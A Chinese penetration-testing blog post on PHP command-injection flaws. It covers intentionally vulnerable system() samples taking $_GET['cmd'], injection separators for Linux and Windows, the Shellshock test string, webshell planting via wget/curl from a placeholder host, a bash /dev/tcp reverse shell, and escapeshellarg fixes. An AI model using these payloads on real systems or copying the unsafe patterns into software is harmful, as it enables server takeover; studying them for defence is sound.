---
draft: false
date: 2016-07-24 14:32:51
title: 命令执行漏洞
description: 
categories:
  - Pentest
tags:
  - rce
---

### 0x00 命令执行
```
应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
```

### 0x01 利用条件
1. 应用调用执行系统命令的函数
2. 将用户输入作为系统命令的参数拼接到了命令行中
3. 没有对用户输入进行过滤或过滤不严

### 0x02 漏洞分类
1. 代码层过滤不严  
    商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：  
    system("/bin/program \-\-arg $arg");
2. 系统的漏洞造成命令执行  
    bash破壳漏洞(CVE-2014-6271)  
    执行```env x='() { :;}; echo vulnerable' bash -c "echo this is a test"```后  
    若输出vulnerable则证明存在漏洞
3. 调用的第三方组件存在代码执行漏洞  
    如WordPress中用来处理图片的ImageMagick组件  
    JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)  
    ThinkPHP命令执行

### 0x03 漏洞危害
1. 继承Web服务程序的权限去执行系统命令或读写文件
2. 反弹shell
3. 控制整个网站甚至控制服务器
4. 进一步内网渗透
5. 等等

### 0x04 漏洞挖掘
可以google hacking  
尝试：filetype:action或filetype:do来找struts2

### 0x05 漏洞可能代码(以system为例)
```php
1. system("$arg");  //直接输入即可
2. system("/bin/prog $arg");  //直接输入;ls
3. system("/bin/prog -p $arg");  //和2一样
4. system("/bin/prog --p=\"$arg\"");  //可以输入";ls;"
5. system("/bin/prog --p='$arg'");  //可以输入';ls;'

在Linux上，上面的;也可以用|、||、&、&&代替
    ;前面的执行完执行后面的(ping -c 1 10.11.11.11;whoami)
    |是管道符，显示后面的执行结果(ping -c 1 10.11.11.11|whoami)
    ||当前面的执行出错时执行后面的(ping -c 1 a.a.a||whoami)
    &会把前面的放在后台执行，然后执行后面的(ping -c 1 10.11.11.11&whoami)
    &&前面的语句为假则直接出错，后面的也不执行(ping -c 1 10.11.11.11&&whoami)

在Windows上，不能用;可以用|、||、&、&&代替
    |直接执行后面的语句(ping -n 1 10.11.11.11|whoami)
    ||前面出错才执行后面的(ping -n 1 a.a.a||whoami)
    &前面执行完执行后面的(ping -n 1 10.11.11.11&whoami)
    &&前面的语句为假则直接出错，后面的也不执行(ping -n 1 10.11.11.11&&whoami)
```

### 0x06 漏洞利用
* 示例一
```php
<?php
    $arg = $_GET['cmd'];
    if ($arg) {
        system("$arg");
    }
?>
```
![命令执行示例1](/img/post/command_execution1.png)

* 示例二
```php
<?php
    $arg = $_GET['cmd'];
    if ($arg) {
        system("ping -c 3 $arg");
    }
```
![命令执行示例2](/img/post/command_execution2.png)

* 示例三
```php
<?php
    $arg = $_GET['cmd'];
    if ($arg) {
        system("ls -al \"$arg\"");
    }
```
![命令执行示例3](/img/post/command_execution3.png)
注：若引号被转义，则可以用<b>\`id\`</b>来执行

* 示例四
```php
<?php
    $arg = $_GET['cmd'];
    if ($arg) {
        system("ls -al '$arg'");
    }
```
![命令执行示例4](/img/post/command_execution4.png)

### 0x07 其他
* 动态函数调用  
在cmd.php中的代码如下：

```php
<?php
    $fun = $_GET['fun'];
    $par = $_GET['par'];
    $fun($par);
?>

//提交http://localhost/cmd.php?fun=system&par=net user，最终执行的是system("net user")
```

### 0x08 关于获取webshell
**要有写权限！**
```
1.得到当前或绝对路径(可以用pwd)
2.写文件:
    用?cmd=echo "<?php phpinfo()?>" > /var/www/html/info.php
    或?cmd=wget -O /var/www/html/info.php http://www.xx.com/phpinfo.txt
    或?cmd=curl http://www.xx.com/phpinfo.txt > /var/www/html/info.php
```

### 0x09 反弹shell
```
远程执行nc -vlp 8888
?cmd=bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
```

### 0x0A 漏洞修复
1. 尽量少用执行命令的函数或者直接禁用
2. 参数值尽量使用引号包括
3. 在使用动态函数之前，确保使用的函数是指定的函数之一
4. 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义

```php
<?php
    $arg = $_GET['cmd'];
    // $arg = addslashes($arg);
    $arg = escapeshellarg($arg);  //拼接前就处理
    if ($arg) {
        system("ls -al '$arg'");
    }
?>
```